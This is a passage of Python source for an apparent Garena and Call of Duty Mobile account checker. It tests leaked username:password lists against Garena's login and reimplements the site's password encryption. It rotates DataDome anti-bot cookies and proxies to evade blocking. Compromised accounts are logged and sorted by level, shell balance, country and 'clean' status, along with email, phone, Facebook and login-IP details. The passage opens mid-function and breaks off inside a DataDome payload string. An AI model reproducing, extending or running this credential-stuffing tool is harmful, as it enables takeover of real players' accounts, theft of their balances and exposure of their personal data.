        valid = s['valid']
        invalid = s['invalid']
        clean = s['clean']
        nc = s['not_clean']
        err = s['error']
        rate = s['rate']
        cpm = s['cpm']
        elapsed = s['elapsed']
        eta_s = s['eta']
        threads_n = s['threads']
        max_thr = s['max_threads']
        ip_ok = not s['ip_blocked']
        hcl = s['hcl']
        hcs = s['hcs']
        hnl = s['hnl']
        hol = s['hol']

        pct = done / total * 100 if total else 0
        bw = 30
        fill = int(pct / 100 * bw)

        MG = '\033[38;2;200;100;255m'
        WH = '\033[97;1m'
        DIM = '\033[2m'
        RST = '\033[0m'
        GN = '\033[92;1m'
        RD = '\033[91;1m'
        YL = '\033[93;1m'

        bar = f"{MG}{'█' * fill}{DIM}{'░' * (bw - fill)}{RST}"
        e = f'{int(elapsed//3600):02d}:{int(elapsed%3600//60):02d}:{int(elapsed%60):02d}'
        eta = f'{int(eta_s//60):02d}m{int(eta_s%60):02d}s'
        
        if self.proxy_mode:
            ip_val = "PROXY"
            ip_col = YL
        else:
            ip_val = "CLEAR" if ip_ok else "BLOCKED"
            ip_col = GN if ip_ok else RD
            
        thr_val = f"{threads_n}/{max_thr}"

        def pad_vis(x, w_):
            vis = len(re.sub(r'\033\[[0-9;]*m', '', str(x)))
            return str(x) + ' ' * max(0, w_ - vis)

        def center(x, w_):
            vis = len(re.sub(r'\033\[[0-9;]*m', '', str(x)))
            total_pad = max(0, w_ - vis)
            left = total_pad // 2
            right = total_pad - left
            return ' ' * left + str(x) + ' ' * right

        prog_bar = f" PROGRESS: {bar}  {MG}{pct:5.1f}%{RST}  [{WH}{done}{RST}/{DIM}{total}{RST}]"
        prog_bar_padded = pad_vis(prog_bar, 66)

        c1_w = 24
        c2_w = 22
        c3_w = 18

        lines = [
            "",
            f"  {MG}╔{'═' * 66}╗{RST}",
            f"  {MG}║{RST}{prog_bar_padded}{MG}║{RST}",
            f"  {MG}╠{'═' * 24}╦{'═' * 22}╦{'═' * 18}╣{RST}",
            f"  {MG}║{RST}{center(f'{MG}[ ACCOUNTS ]{RST}', c1_w)}{MG}║{RST}{center(f'{MG}[ PERFORMANCE ]{RST}', c2_w)}{MG}║{RST}{center(f'{MG}[ HIGHLIGHTS ]{RST}', c3_w)}{MG}║{RST}",
            f"  {MG}║{RST}{pad_vis(f' VALID     : {GN}{valid:<8}{RST}', c1_w)}{MG}║{RST}{pad_vis(f' CPM       : {WH}{cpm:<8.0f}{RST}', c2_w)}{MG}║{RST}{pad_vis(f' TOP CLEAN : {GN}{hcl:<5}{RST}', c3_w)}{MG}║{RST}",
            f"  {MG}║{RST}{pad_vis(f' INVALID   : {RD}{invalid:<8}{RST}', c1_w)}{MG}║{RST}{pad_vis(f' SPEED     : {WH}{rate:<8.1f}{RST}', c2_w)}{MG}║{RST}{pad_vis(f' TOP SHELL : {YL}{hcs:<5}{RST}', c3_w)}{MG}║{RST}",
            f"  {MG}║{RST}{pad_vis(f' CLEAN     : {GN}{clean:<8}{RST}', c1_w)}{MG}║{RST}{pad_vis(f' ELAPSED   : {WH}{e:<8}{RST}', c2_w)}{MG}║{RST}{pad_vis(f' TOP NC    : {YL}{hnl:<5}{RST}', c3_w)}{MG}║{RST}",
            f"  {MG}║{RST}{pad_vis(f' NOT CLEAN : {YL}{nc:<8}{RST}', c1_w)}{MG}║{RST}{pad_vis(f' ETA       : {WH}{eta:<8}{RST}', c2_w)}{MG}║{RST}{pad_vis(f' PEAK LVL  : {MG}{hol:<5}{RST}', c3_w)}{MG}║{RST}",
            f"  {MG}║{RST}{pad_vis(f' ERRORS    : {DIM}{err:<8}{RST}', c1_w)}{MG}║{RST}{pad_vis(f' THREADS   : {WH}{thr_val:<8}{RST}', c2_w)}{MG}║{RST}{pad_vis(f' IP STATUS : {ip_col}{ip_val:<5}{RST}', c3_w)}{MG}║{RST}",
            f"  {MG}╚{'═' * 24}╩{'═' * 22}╩{'═' * 18}╝{RST}",
            ""
        ]
        return '\n'.join(lines)

class Scribe:
    def __init__(self, combo_file_path, create_dirs=True):
        self.combo_file_name = Path(combo_file_path).stem
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.base_dir = Path(f'Results/output_{self.combo_file_name}')
        if create_dirs:
            for sub in ('Country', 'Level', 'Garena Shells'):
                (self.base_dir / sub).mkdir(parents=True, exist_ok=True)
            if other:
                (self.base_dir / 'Games').mkdir(parents=True, exist_ok=True)
        self._file_locks = {}
        self._locks_meta = threading.Lock()
        self._counter = 0
        self._counter_lock = threading.Lock()

    def lock_of(self, fp):
        fp = str(fp)
        with self._locks_meta:
            if fp not in self._file_locks:
                self._file_locks[fp] = threading.Lock()
            return self._file_locks[fp]

    def nxt(self):
        with self._counter_lock:
            self._counter += 1
            return self._counter

    @staticmethod
    def level_of(entry):
        m = re.search('Account Level:\\s*(\\d+)', entry)
        return int(m.group(1)) if m else 0

    @staticmethod
    def shell_of(entry):
        m = re.search('Garena Shell:\\s*(\\d+)', entry)
        return int(m.group(1)) if m else 0

    def write_sorted(self, filepath, new_entry_body, sort_by='level'):
        filepath = str(filepath)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with self.lock_of(filepath):
            entries = []
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                    content = f.read()
                raw_entries = content.strip().split('\n' + '-' * 60 + '\n')
                for raw_entry in raw_entries:
                    raw_entry = raw_entry.strip()
                    if raw_entry:
                        if raw_entry.startswith('-' * 60):
                            raw_entry = raw_entry[len('-' * 60):].strip()
                        if raw_entry.endswith('-' * 60):
                            raw_entry = raw_entry[:-len('-' * 60)].strip()
                        entries.append(raw_entry)
            new_entry = new_entry_body.strip()
            if new_entry.startswith('-' * 60):
                new_entry = new_entry[len('-' * 60):].strip()
            if new_entry.endswith('-' * 60):
                new_entry = new_entry[:-len('-' * 60)].strip()
            entries.append(new_entry)

            if sort_by == 'shell':
                entries.sort(key=self.shell_of, reverse=True)
            else:
                entries.sort(key=self.level_of, reverse=True)

            with open(filepath, 'w', encoding='utf-8', errors='replace') as f:
                for i, entry in enumerate(entries):
                    f.write('-' * 60 + '\n')
                    f.write(entry.strip())
                    f.write('\n' + '-' * 60)
                    if i < len(entries) - 1:
                        f.write('\n\n')

    def append(self, filepath, line):
        filepath = str(filepath)
        with self.lock_of(filepath):
            with open(filepath, 'a', encoding='utf-8', errors='replace') as f:
                f.write(line + '\n')

    @staticmethod
    def ascii_val(val):
        if not val or val == 'N/A':
            return val
        cleaned = ''.join(
            c for c in str(val) if c >= ' ' or c in '\t'
        ).strip()
        return cleaned or 'N/A'

    def server(self, region_code):
        if not region_code or region_code == 'N/A':
            return 'N/A'
        region_info = regions.get(str(region_code).upper(), {}) if region_code and region_code != 'N/A' else {}
        return f"{region_info['name']} ({region_code})" if region_info else str(region_code)

    def format(self, account_data, index=1):
        acct = account_data.get('account', 'N/A')
        pwd = account_data.get('password', 'N/A')
        if account_data.get('is_error'):
            return (
                '-' * 60
                + f"\nAccount: {acct} : {pwd}\n"
                + f"Error: {account_data.get('error_reason', 'Unknown')}\n"
                + '-' * 60
            )
        is_clean = account_data.get('is_clean', False)
        has_codm = account_data.get('has_codm', False)

        base_lines = [
            '=' * 60,
            f'Account: {acct}:{pwd}',
            f'UID: {account_data.get("uid", "N/A")}',
            f'Username: {self.ascii_val(account_data.get("username", "N/A"))}',
            f'Garena Shell: {account_data.get("shell_balance", 0)}',
            f'Email: {account_data.get("email_display", "N/A")}',
            f'Mobile: {account_data.get("formatted_mobile", "N/A")}',
            f'Country: {account_data.get("country", "N/A")}',
            f'Nickname: {self.ascii_val(account_data.get("nickname", "N/A"))}',
            '',
            '--- Facebook Information ---',
            f'Facebook Username: {self.ascii_val(account_data.get("fb_username", "N/A"))}',
            f'Facebook Link: {account_data.get("fb_link", "N/A")}',
            f'Facebook Status: {account_data.get("fb_info", "N/A")}',
            '',
            '--- Login History ---',
            f'Last Login: {account_data.get("last_login_date", "N/A")}',
            f'Last Login From: {account_data.get("last_login_where", "N/A")}',
            f'Last Login IP: {account_data.get("last_login_ip", "N/A")}',
            f'Last Login Country: {account_data.get("last_login_country", "N/A")}',
            '',
            f'Account Status: {"Clean" if is_clean else "Not Clean"}',
            '',
            'Powered by: @dvlist',
            '=' * 60
        ]

        if not has_codm:
            return '\n'.join(base_lines)

        codm_lines = [
            '--- CODM Information ---',
            f'Account Level: {account_data.get("codm_level", "N/A")}',
            f'Server: {self.server(account_data.get("codm_region", "N/A"))}',
            f'IGN: {self.ascii_val(account_data.get("codm_nickname", "N/A"))}',
            f'UID: {account_data.get("codm_uid", account_data.get("uid", "N/A"))}',
            ''
        ]

        login_index = base_lines.index('--- Login History ---')
        final_lines = base_lines[:login_index] + codm_lines + base_lines[login_index:]
        return '\n'.join(final_lines)

    def add(self, account_data):
        if hook and (not account_data.get('is_error')):
            threading.Thread(target=hook, args=(account_data,), daemon=True).start()
        if account_data.get('is_error'):
            return
        combo = f"{account_data.get('account', '')}:{account_data.get('password', '')}"
        entry = self.format(account_data, index=self.nxt())
        has_codm = account_data.get('has_codm', False)
        is_clean = account_data.get('is_clean', False)
        shell = int(account_data.get('shell_balance', 0) or 0)
        timestamp = self.timestamp

        self.write_sorted(self.base_dir / f'All_Accounts_{timestamp}.txt', entry)
        self.append(self.base_dir / f'Valid_Accounts_{timestamp}.txt', combo)

        if is_clean and has_codm:
            self.write_sorted(self.base_dir / f'Clean Accounts.txt', entry)
        elif has_codm:
            self.write_sorted(self.base_dir / f'Not Clean Accounts.txt', entry)

        if not has_codm:
            self.write_sorted(self.base_dir / f'NO CODM Accounts.txt', entry)
            if shell > 0:
                self.write_sorted(
                    self.base_dir / 'Garena Shells' / f'NO CODM Shells.txt',
                    entry,
                    sort_by='shell'
                )
            return

        country = str(account_data.get('country', 'XX') or 'XX').strip().upper()
        self.write_sorted(
            self.base_dir / 'Country' / f'{country}_Accounts_{timestamp}.txt',
            entry
        )

        try:
            lvl = int(account_data.get('codm_level', 0) or 0)
        except (ValueError, TypeError):
            lvl = 0
        if lvl <= 100:
            bucket = '1-100.txt'
        elif lvl <= 200:
            bucket = '101-200.txt'
        elif lvl <= 350:
            bucket = '201-350.txt'
        else:
            bucket = '351-450.txt'
        self.write_sorted(self.base_dir / 'Level' / bucket, entry)

        if shell > 0:
            self.write_sorted(
                self.base_dir / 'Garena Shells' / f'CODM Shells.txt',
                entry,
                sort_by='shell'
            )

scrpath = os.path.dirname(os.path.abspath(__file__))
hook = None

sessfile = 'cookies.txt'
proxies = False
pool = []
cursor = 0
poollock = threading.Lock()

seeds = []
seedlock = threading.Lock()
seedidx = {'i': 0}

seedfile = 'seeds.txt'

def gather():
    global seeds
    collected = []
    if os.path.exists(seedfile):
        try:
            with open(seedfile, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if 'datadome=' in line:
                        for piece in line.split('|'):
                            piece = piece.strip()
                            if piece.startswith('datadome='):
                                v = piece.split('=', 1)[1].strip()
                                if v:
                                    collected.append(v)
                                break
                    else:
                        collected.append(line)
        except Exception:
            pass
    with seedlock:
        seeds = collected
        seedidx['i'] = 0
    return len(collected)

def cycle():
    with seedlock:
        if not seeds:
            return None
        i = seedidx['i']
        seedidx['i'] = (i + 1) % len(seeds)
        return seeds[i]

age = 6 * 3600
uses = 10
authmode = False
current = None
currentuse = 0

def replenish():
    global pool, cursor, current, currentuse
    collected = []
    if os.path.exists(sessfile):
        try:
            with open(sessfile, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    collected.append(line)
        except Exception:
            pass
    with poollock:
        pool = collected
        cursor = 0
        current = None
        currentuse = 0
    return len(collected)

def reindex():
    return replenish()

def capture(session, session_key):
    if not session_key:
        return ''
    try:
        r = session.get(
            f'https://account.garena.com/?session_key={session_key}',
            headers={
                'user-agent': (
                    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
                    '(KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36'
                ),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            },
            timeout=20, allow_redirects=True,
        )
        ac = r.cookies.get('ac_session') or session.cookies.get('ac_session')
        if ac:
            session.cookies.set('ac_session', ac, domain='.garena.com')
        return ac or ''
    except Exception:
        return ''

def acquire():
    global cursor, current, currentuse
    with poollock:
        if not pool:
            return None

        if current and currentuse < uses:
            currentuse += 1
            return current

        if cursor >= len(pool):
            cursor = 0

        current = pool[cursor]
        currentuse = 1
        cursor += 1
        return current

def route(account):
    return acquire()

def bind(session, datadome_manager, session_entry):
    if not session_entry:
        return False
    cookie_str = ''
    if isinstance(session_entry, str):
        cookie_str = session_entry
    elif isinstance(session_entry, dict):
        cookie_str = session_entry.get('cookies', '')
    if not cookie_str:
        return False
    try:
        instill(session, cookie_str)
        return True
    except Exception:
        return False

class Relay:
    def __init__(self, enabled=True, fallback_url=None, proxy_file="proxies.txt"):
        self.enabled = enabled
        self.proxies = []
        self._index = 0
        self._counter = 0
        self._lock = threading.Lock()
        self._health = {}
        self._max_fails = 5
        self._cooldown_seconds = 300

        if not enabled:
            return

        if fallback_url:
            self.proxies = [fallback_url]
        elif proxy_file and Path(proxy_file).exists():
            self._load_from_file(proxy_file)

    def _load_from_file(self, proxy_file):
        with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                url = interpret(line)
                if url:
                    self.proxies.append(url)

    def _key(self, proxy_str):
        return proxy_str or '__direct__'

    def okay(self, proxy_url):
        if not self.enabled:
            return
        with self._lock:
            key = self._key(proxy_url)
            entry = self._health.setdefault(
                key,
                {'fails': 0, 'success': 0, 'cooldown_until': 0}
            )
            entry['success'] += 1

    def fault(self, proxy_url, is_403=False):
        if not self.enabled:
            return
        with self._lock:
            key = self._key(proxy_url)
            entry = self._health.setdefault(
                key,
                {'fails': 0, 'success': 0, 'cooldown_until': 0}
            )
            entry['fails'] += 1
            if is_403 or entry['fails'] >= self._max_fails:
                entry['cooldown_until'] = time.time() + self._cooldown_seconds
                entry['fails'] = 0

    def next(self):
        if not self.enabled or not self.proxies:
            return None
        with self._lock:
            now = time.time()
            for _ in range(len(self.proxies)):
                proxy = self.proxies[self._index % len(self.proxies)]
                self._index += 1
                entry = self._health.get(
                    self._key(proxy),
                    {'cooldown_until': 0}
                )
                if entry.get('cooldown_until', 0) < now:
                    self._counter += 1
                    return {'http': proxy, 'https': proxy}
            proxy = self.proxies[self._index % len(self.proxies)]
            self._index += 1
            self._counter += 1
            return {'http': proxy, 'https': proxy}

    def ready(self):
        return self.enabled and len(self.proxies) > 0

    def count(self):
        return len(self.proxies)

def pluck(cookie_str):
    if not cookie_str:
        return ''
    val = cookie_str.strip()
    for sep in (';', '|'):
        if sep in val:
            for piece in val.split(sep):
                piece = piece.strip()
                if piece.startswith('datadome='):
                    return piece.split('=', 1)[1].strip()
    if val.startswith('datadome='):
        return val.split('=', 1)[1].strip()
    return val

class Jar:

    def __init__(self):
        self.banned = set()
        self.live = []
        self.lock = threading.Lock()
        self._load_banned()
        self._load_initial()

    def _load_banned(self):
        if os.path.exists('banned_cookies.txt'):
            try:
                with open('banned_cookies.txt', 'r', encoding='utf-8', errors='ignore') as f:
                    self.banned = set(line.strip() for line in f if line.strip())
            except Exception:
                pass

    def _extract(self, cookie_str):
        return pluck(cookie_str)

    def banned_p(self, cookie):
        dd = self._extract(cookie)
        return (
            (cookie in self.banned)
            or (dd in self.banned)
            or (f'datadome={dd}' in self.banned)
        )

    def _load_initial(self):
        cookie_file = 'fresh_cookie.txt'
        if not os.path.exists(cookie_file):
            import glob as _glob
            candidates = (
                sorted(_glob.glob('fresh_cookie*.txt'))
                + sorted(_glob.glob('seeds*.txt'))
            )
            if candidates:
                cookie_file = candidates[0]
        if os.path.exists(cookie_file):
            try:
                with open(cookie_file, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        cookie = line.strip()
                        if cookie and not self.banned_p(cookie):
                            self.live.append(cookie)
            except Exception:
                pass

    def ban(self, cookie_value):
        if not cookie_value:
            return
        dd = self._extract(cookie_value)
        formatted = f'datadome={dd}' if dd else cookie_value
        with self.lock:
            if self.live:
                self.live = [
                    ck for ck in self.live
                    if self._extract(ck) != dd
                    and ck != formatted
                    and ck != cookie_value
                ]
            if formatted not in self.banned:
                self.banned.add(formatted)
                if dd:
                    self.banned.add(dd)
                self._append('banned_cookies.txt', formatted)

    def pick(self):
        with self.lock:
            if not self.live:
                return None
            return random.choice(self.live)

    def valids(self):
        with self.lock:
            if not self.live:
                return []
            return random.sample(self.live, min(5, len(self.live)))

    def keep(self, datadome_value):
        if not datadome_value:
            return False
        val = datadome_value.strip()
        formatted = val if val.startswith('datadome=') else f'datadome={val}'
        with self.lock:
            if formatted not in self.banned and formatted not in self.live:
                self.live.append(formatted)
                self._append('fresh_cookie.txt', formatted)
                return True
        return False

    def _append(self, filename, content):
        try:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(content + '\n')
        except Exception:
            pass

def seal(plaintext, key):
    k = bytes.fromhex(key)
    pt = bytes.fromhex(plaintext)
    box = AES.new(k, AES.MODE_ECB)
    ct = box.encrypt(pt)
    return ct.hex()[:32]

def digest(password):
    decoded = urllib.parse.unquote(password)
    return hashlib.md5(decoded.encode('utf-8')).hexdigest()

def cipher(password, v1, v2):
    passmd5 = digest(password)
    inner = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer = hashlib.sha256((inner + v2).encode()).hexdigest()
    return seal(passmd5, outer)

def instill(session, cookie_str):
    session.cookies.clear()
    if not cookie_str:
        return

    s = cookie_str.strip()
    pairs = []

    if '|' in s:
        for piece in s.split('|'):
            piece = piece.strip()
            if not piece or '=' not in piece:
                continue
            k, v = piece.split('=', 1)
            k, v = k.strip(), v.strip()
            if k:
                pairs.append((k, v))

    if not pairs:
        for piece in s.split(';'):
            piece = piece.strip()
            if not piece or '=' not in piece:
                continue
            try:
                k, v = piece.split('=', 1)
                pairs.append((k.strip(), v.strip()))
            except ValueError:
                pass

    for k, v in pairs:
        if not k or not v:
            continue
        if k == 'ga':
            session.cookies.set('_ga', v, domain='.garena.com')
        elif k.startswith('ga_') and not k.startswith('_ga'):
            session.cookies.set('_' + k, v, domain='.garena.com')
        else:
            session.cookies.set(k, v, domain='.garena.com')

ipwaitlock = threading.Lock()
ipactive = False
ipevent = threading.Event()
ipsilent = False
ipcallback = None

def persist(session):
    return False

def seed(session):
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    ga_cookies = {
        '_ga': f'GA1.1.{random_id}.{timestamp}',
        '_ga_XB5PSHEQB4': f'GS2.1.s{timestamp}$o1$g0$t{timestamp}$j53$l0$h0',
        '_ga_1M7M9L6VPX': f'GS2.1.s{timestamp}$o6$g0$t{timestamp}$j60$l0$h0',
        '_gid': f'GA1.2.{random.randint(100000000, 999999999)}.{timestamp}'
    }
    for name, value in ga_cookies.items():
        session.cookies.set(name, value, domain='.garena.com')
    return ga_cookies

class Weaver:

    def init(self, key: str, cookie: str):
        self.key = key
        self.cookie = cookie
        self.t = 9959949970
        self.n = 1789537805

    def _hash_str_to_int(self, s: str) -> int:
        if not s:
            return self.n
        o = 0
        for char in s:
            o = (o << 5) - o + ord(char) & 4294967295
        return o

    def _prng_h(self, n: int) -> int:
        n ^= n << 13
        n ^= n >> 17 & 4294967295
        n ^= n << 5
        return n & 4294967295

    def _create_keystream_generator(self, seed1: int, seed2: int):
        e = seed1
        i = -1
        r = seed2
        a = True
        u = None

        def generator(get_val: bool = False) -> int:
            nonlocal e, i, r, a, u
            if u is not None:
                t = u
                u = None
                return t
            i += 1
            if i > 2:
                e = self._prng_h(e)
                i = 0
            t = e >> 16 - 8 * i & 255
            if a:
                r -= 1
                t ^= r & 255
            if get_val:
                u = t
            return t
        a = False
        return generator

    def _custom_b64_encode_char(self, n: int) -> int:
        if 37 < n:
            return 59 + n
        if 11 < n:
            return 53 + n
        if 1 < n:
            return 46 + n
        return 50 * n + 45

    def generate_payload(self, data: dict[str, any], timestamp: int) -> str:
        seed_from_cookie = self._hash_str_to_int(self.cookie)
        initial_seed = self.t ^ seed_from_cookie ^ self._hash_str_to_int(self.key)
        e = self._prng_h(
            self._prng_h((timestamp >> 3 ^ 11027890091) * self.t)
        )
        ks_a = self._create_keystream_generator(initial_seed, e)
        payload_bytes = []
        is_first = True

        def stringify(val: Any) -> str:
            return json.dumps(val)

        def encrypt_str(s: str) -> List[int]:
            buffer = s.encode('utf-8')
            encrypted = []
            for byte in buffer:
                encrypted.append(byte ^ ks_a())
            return encrypted
        for key, value in data.items():
            if not is_first:
                payload_bytes.append(ks_a() ^ 44)
            key_bytes = encrypt_str(stringify(key))
            value_bytes = encrypt_str(stringify(value))
            payload_bytes.extend(key_bytes)
            payload_bytes.append(ks_a() ^ 58)
            payload_bytes.extend(value_bytes)
            is_first = False
        ks_b = self._create_keystream_generator(
            1809053797 ^ self._hash_str_to_int(self.cookie),
            e
        )
        final_bytes = [byte ^ ks_b() for byte in payload_bytes]
        final_bytes.append(ks_a(True) ^ 125 ^ ks_b())
        result_chars = []
        w = 0
        b = e
        while w < len(final_bytes):
            b = b - 1 & 4294967295
            byte1 = b & 255 ^ final_bytes[w]
            w += 1
            b = b - 1 & 4294967295
            byte2 = b & 255 ^ final_bytes[w] if w < len(final_bytes) else 0
            w += 1
            b = b - 1 & 4294967295
            byte3 = b & 255 ^ final_bytes[w] if w < len(final_bytes) else 0
            w += 1
            z = byte1 << 16 | byte2 << 8 | byte3
            result_chars.append(chr(self._custom_b64_encode_char(z >> 18 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z >> 12 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z >> 6 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z & 63)))
        padding = len(final_bytes) % 3
        if padding > 0:
            return ''.join(result_chars[:-(3 - padding)])
        return ''.join(result_chars)

class Warden:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        self._local_lock = threading.Lock()
        self._local_request_count = 0
        self._local_max_requests = 250

    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)

    def get_datadome(self):
        return self.current_datadome

    def clear_datadome(self):
        self.current_datadome = None

    def tick_request(self):
        with self._local_lock:
            self._local_request_count += 1

    def needs_rotation(self):
        with self._local_lock:
            return self._local_request_count >= self._local_max_requests

    def reset_counter(self):
        with self._local_lock:
            self._local_request_count = 0

    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception:
            return None

    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception:
            pass

    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception:
            return False

    def get_current_ip(self):
        ip_services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ident.me',
            'https://checkip.amazonaws.com'
        ]
        for service in ip_services:
            try:
                response = requests.get(service, timeout=8)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except Exception:
                continue
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        global ipwaitlock, ipactive, ipevent, proxies
        if proxies:
            return False
        with ipwaitlock:
            if ipactive:
                is_primary = False
            else:
                ipactive = True
                ipevent.clear()
                is_primary = True
        if not is_primary:
            ipevent.wait(timeout=max_wait_time + 30)
            return True
        try:
            original_ip = self.get_current_ip()
            if not original_ip:
                if not ipsilent:
                    herald('WARNING', 'IP BLOCKED — could not detect IP, waiting 10s')
                if ipcallback:
                    ipcallback(True)
                time.sleep(10)
                if ipcallback:
                    ipcallback(False)
                return True
            if not ipsilent:
                herald('ERROR', f'IP BLOCKED — [bold]{original_ip}[/bold]')
                herald('WARNING', 'Change your IP now — VPN / Mobile Data / Airplane Mode')
            if ipcallback:
                ipcallback(True)
            start_time = time.time()
            if not ipsilent:
                with Progress(
                    SpinnerColumn(),
                    TextColumn('[progress.description]{task.description}'),
                    BarColumn(),
                    TimeElapsedColumn(),
                    console=console,
                    transient=True
                ) as progress:
                    task = progress.add_task(
                        '[yellow]Waiting for IP change…',
                        total=max_wait_time
                    )
                    while time.time() - start_time < max_wait_time:
                        time.sleep(check_interval)
                        progress.update(
                            task,
                            completed=time.time() - start_time
                        )
                        current_ip = self.get_current_ip()
                        if current_ip and current_ip != original_ip:
                            herald(
                                'SUCCESS',
                                f'IP changed: [dim]{original_ip}[/dim] → '
                                f'[bold bright_green]{current_ip}[/bold bright_green]'
                            )
                            if ipcallback:
                                ipcallback(False)
                            return True
                herald('ERROR', 'IP did not change within time limit')
                if ipcallback:
                    ipcallback(False)
                return False
            else:
                _last_tick = time.time()
                while time.time() - start_time < max_wait_time:
                    time.sleep(check_interval)
                    if time.time() - _last_tick >= 3.0:
                        if ipcallback:
                            ipcallback(True)
                        try:
                            _elapsed = int(time.time() - start_time)
                            _ip_now = self.get_current_ip() or 'unknown'
                            _log_line = (
                                f'[dim]····[/dim]  [red]IP WAIT[/red]  '
                                f'[dim]{_elapsed}s  ·  current={_ip_now}[/dim]'
                            )
                            _cb = globals().get('_dashboard_ref')
                            if _cb:
                                with _cb._lock:
                                    _cb.recent.append(_log_line)
                                    _cb._dirty = True
                        except Exception:
                            pass
                        _last_tick = time.time()
                    current_ip = self.get_current_ip()
                    if current_ip and current_ip != original_ip:
                        if ipcallback:
                            ipcallback(False)
                        return True
                if ipcallback:
                    ipcallback(False)
                return False
        finally:
            with ipwaitlock:
                ipactive = False
            ipevent.set()

    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            if self.wait_for_ip_change(session):
                self._403_attempts = 0
                self.clear_datadome()
                self.reset_counter()
                self.clear_session_datadome(session)
                new_datadome = garner(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                return True
            else:
                return False
        return False

def garner(session, proxies_arg=None):
    url = 'https://datadome.garena.com/js/'
    headers = {
        'host': 'datadome.garena.com',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': (
            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
            '(KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36'
        ),
        'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        'content-type': 'application/x-www-form-urlencoded',
        'sec-ch-ua-mobile': '?1',
        'accept': '*/*',
        'origin': 'https://account.garena.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://account.garena.com/',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=1, i'
    }
    payload = {
        'jspl': 'uhk7aBw8V8QkzKqkD7oowSyHXYy8ZX7MmiUVrKaorg4WGvVIeIUSbulWtdOJ-PUEdBXKeo0f3jFGgmzdlB85r2RTWFz9fVv5sihqWKKaYJ6CqD-x5zgp4GOG3qoJiFhGN4kuNWqswcZLbrpRGv_O6e2sAwpgKZ7UoEV71CS52-nzpUt2jfpFIwctsv3plEmyMubajP6vKWqxE6fF4kkWUvI8q9dzm6A5lBucuHv8D4ZIT-WHjjpgX1Q0FQkkEIjmpzHUxJ0DRxcPKRuxAUzAO6pONT5WAHDO1jKmP3X2um9tUpE2TL7uq4RFr39BXU1iVX-cCHBf_sW242UicatUznsEPvwDhgbbd7b3t1CWZ4bekhZNAa92m1_keFZXckvIVqAvC4nT35Ir9pKHWXIa15NRSZqUG32SVsipj9JUkNEStxCDYJqzBY-UMZeuXHIJdTitf1f0bndipuAe6bgF7yqCi7hIjD-PpV-L5RbW6i8HMiaxCiECXJUA6tebiecmDc1SZrhTDhWyD_jTwxjfveNNWKAsQH8EQ7G0xiD97wfxfNp7F2cdEcYj84ncOMT5BuhwIjhb8PwcPdu_bTVWbvSB6AgR0SJVShMjcVNKz9z2ol1m-lFkIMA78dlk-xqMBQa-P4V-UPqIwLHUsbhf4NP_CbSh49dkO2ul_jp3X-ZprX00HWUschukkHYxwuUd9ppO8L8dnaYVIFCltePBoWFTgaxjYrQEjuFbiy9uhMagFkGiLpt0JtBL0sGKM2JClV-KbTqDPix1hrTDU2LO20NFh6g8s3v42ix4zE6bqdijVO61jFYv2pZUJPGS6eTcKcLGbBwD1NYsI1aZ2OotVwX5i1udmlSjm3q_-7aguTeAWzmqZk36jUOrccoTnwAwDbRfpNqZU6gLVQs-xLYJhHCos3vGFCS-Ku4URj5fTmoZhdxqMViI-IaGQrEJ3qsEfuvi-ch9owf37yzu97gNduNAt0bhlHkE2BE05Yc-lcbcewv8yKp4F4G7ff-AlM3mejP6yhxvHuNqUXjLD-mXJ2axxVSfFep_Vh74lNGhTXbT4D_DfDohQonHT8U2Anml_5zsR8KFzVZRXn4HIbQcR_5E8PKijaoIU3OEhmjzMRledTIFLWD8gxruwMBMbgxFI11DxuwuIiCP4QFSMd9qItvv2lW5HXUN3tqdBf6ioXgCR1wkmZxwpXfbNrwovhZ9_58OvnplHBRFIj78DWKM5p2p83rXSpx6rH203gKthaI8XFJUBKtZZeW